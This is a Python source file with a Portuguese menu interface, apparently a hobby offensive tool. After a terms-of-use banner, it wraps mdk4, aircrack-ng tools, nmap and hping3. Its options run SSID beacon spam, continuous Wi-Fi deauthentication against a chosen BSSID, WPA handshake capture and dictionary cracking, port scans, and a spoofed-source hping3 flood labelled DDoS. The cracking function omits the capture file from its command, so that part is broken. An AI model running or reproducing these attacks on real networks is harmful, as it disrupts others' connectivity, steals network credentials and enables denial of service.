import os
import sys
import shutil
import time
import subprocess
from datetime import datetime
from rich import print
from rich.panel import Panel
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

ARQUIVO_TERMO = ".termos_aceitos.txt"
console = Console()
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

def executar_comando(comando):
    try:
        subprocess.run(comando.split(), check=True)
    except subprocess.CalledProcessError:
        print(f"[red]Erro ao executar:[/red] {comando}")

def solicitar_aceite():
    console.print(Panel.fit("""[bold cyan]
    🛡️ FERRAMENTA DE SEGURANÇA - TERMOS DE USO
[/bold cyan]
[bold white]ATENÇÃO:[/bold white] Esta ferramenta foi desenvolvida apenas para fins [bold yellow]educacionais[/bold yellow] e uso em [bold yellow]ambientes controlados[/bold yellow].

[bold red]⚠️ Uso não autorizado[/bold red] pode violar o [bold red]Art. 154-A do Código Penal Brasileiro[/bold red].

O desenvolvedor [bold]NÃO se responsabiliza[/bold] por qualquer uso indevido.

Ao continuar, você declara estar ciente de que este projeto é apenas para estudos,
testes em laboratório ou com permissão explícita do proprietário.

[bold]Você concorda com os termos acima?[/bold]
Digite [green]y[/green] para [bold green]SIM[/bold green] ou [red]n[/red] para [bold red]NÃO[/bold red].
""", title="[bold blue]Termos de Uso[/bold blue]", border_style="blue"))

    resposta = Prompt.ask("[bold cyan]Sua resposta[/bold cyan]", choices=["y", "n"], default="n").lower()
    with open(ARQUIVO_TERMO, "w") as f:
        f.write(resposta)

    if resposta == "y":
        print("\n[bold green]✅ Termos aceitos. Iniciando a ferramenta...[/bold green]\n")
    else:
        print("\n[bold red]❌ Termos recusados. Encerrando o programa.[/bold red]\n")
        sys.exit()

def verificar_comando(comando):
    time.sleep(1)
    return shutil.which(comando) is not None

def verificar_reqs():
    print("[bold cyan]\n🔍 Iniciando verificação de dependências...\n[/bold cyan]")
    comandos = ["airmon-ng", "airodump-ng", "mdk4", "aireplay-ng", "aircrack-ng", "nmap", "hping3"]
    resultados = {}

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=30),
        TimeElapsedColumn(),
        transient=True,
    ) as progress:
        tarefas = {cmd: progress.add_task(f"Verificando {cmd}...", total=1) for cmd in comandos}

        for nome, task_id in tarefas.items():
            resultados[nome] = verificar_comando(nome)
            progress.update(task_id, advance=1)

    mensagem = "[bold cyan]🔍 Verificação de dependências:\n\n"
    for cmd in comandos:
        status = "[green]✅ Encontrado[/green]" if resultados[cmd] else "[red]❌ Não encontrado[/red]"
        mensagem += f"[bold white]- {cmd}: [/bold white]{status}\n"
    mensagem += "\n[/bold cyan]"

    all_ok = all(resultados.values())
    status = "[bold green]✔ Tudo pronto para iniciar os testes![/bold green]" if all_ok else "[bold yellow]⚠ Algumas ferramentas não foram encontradas.[/bold yellow]"
    print(Panel.fit(mensagem + status, title="[bold blue]Verificação do Sistema[/bold blue]", border_style="blue"))

def verificar_termo():
    if os.path.exists(ARQUIVO_TERMO):
        with open(ARQUIVO_TERMO, "r") as f:
            resposta = f.read().strip().lower()
            if resposta == "n":
                print("\n[bold red] Termos de uso já recusados.[/bold red]")
                print("[yellow]Encerrando a ferramenta...[/yellow]\n")
                sys.exit()
            elif resposta == "y":
                print("\n[bold green] Termos de uso aceitos.[/bold green]")
                time.sleep(1)
                return True
    solicitar_aceite()
    return True

# === Funções principais ===

def spam():
    interface = Prompt.ask("[cyan]Interface Wi-Fi (ex: wlan0mon)[/cyan]")
    rps = Prompt.ask("[cyan]Redes por segundo[/cyan]")
    wordlist = Prompt.ask("[cyan]Wordlist de SSIDs[/cyan]")
    comando = f"sudo mdk4 {interface} b -s {rps} -f {wordlist}"
    executar_comando(comando)

def scan_redes():
    interface = Prompt.ask("[cyan]Interface em modo monitor[/cyan]")
    comando = f"sudo airodump-ng {interface}"
    executar_comando(comando)

def deauth():
    interface = Prompt.ask("[cyan]Interface em modo monitor[/cyan]")
    bssid = Prompt.ask("[cyan]BSSID do alvo[/cyan]")
    comando = f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"
    executar_comando(comando)

def capturar_handshake():
    interface = Prompt.ask("[cyan]Interface em modo monitor[/cyan]")
    bssid = Prompt.ask("[cyan]BSSID da rede[/cyan]")
    canal = Prompt.ask("[cyan]Canal[/cyan]")
    output = Prompt.ask("[cyan]Nome do arquivo de saída[/cyan]")
    output_path = os.path.join(LOG_DIR, output)
    comando = f"sudo airodump-ng -c {canal} --bssid {bssid} -w {output_path} {interface}"
    executar_comando(comando)

def quebrar_handshake():
    cap = Prompt.ask("[cyan]Arquivo .cap[/cyan]")
    wordlist = Prompt.ask("[cyan]Wordlist[/cyan]")
    cap_path = os.path.join(LOG_DIR, cap)
    comando = f"sudo aircrack-ng -w {wordlist}"
    executar_comando(comando)

def scan_site_nmap():
    alvo = Prompt.ask("[cyan]IP ou domínio[/cyan]")
    opcoes = Prompt.ask("[cyan]Opções do nmap[/cyan]", default="-sS -p 1-1000")
    comando = f"sudo nmap {opcoes} {alvo}"
    executar_comando(comando)

def ddos_hping3():
    alvo = Prompt.ask("[cyan]IP alvo[/cyan]")
    iface = Prompt.ask("[cyan]Interface de rede[/cyan]")
    taxa = Prompt.ask("[cyan]Pacotes por segundo[/cyan]")
    comando = f"sudo hping3 --flood --rand-source -I {iface} -i u{taxa} {alvo}"
    executar_comando(comando)

# === Menu ===

def menu():
    while True:
        print(Panel.fit(
            """[bold cyan][1][/bold cyan] Spam SSID
[bold cyan][2][/bold cyan] Scan redes
[bold cyan][3][/bold cyan] Deauth
[bold cyan][4][/bold cyan] Capturar handshake
[bold cyan][5][/bold cyan] Quebrar handshake
[bold cyan][6][/bold cyan] Scan site com nmap
[bold cyan][7][/bold cyan] DDoS com hping3
[bold cyan][8][/bold cyan] Sair
""", title="[bold blue]Menu Principal[/bold blue]", border_style="blue"))

        opcao = Prompt.ask("[bold cyan]Escolha uma opção[/bold cyan]", choices=[str(i) for i in range(1,9)], default="8")
        if opcao == "1": spam()
        elif opcao == "2": scan_redes()
        elif opcao == "3": deauth()
        elif opcao == "4": capturar_handshake()
        elif opcao == "5": quebrar_handshake()
        elif opcao == "6": scan_site_nmap()
        elif opcao == "7": ddos_hping3()
        elif opcao == "8":
            print("[bold green]Saindo... Até mais![/bold green]")
            break

if __name__ == "__main__":
    verificar_termo()
    verificar_reqs()
    menu()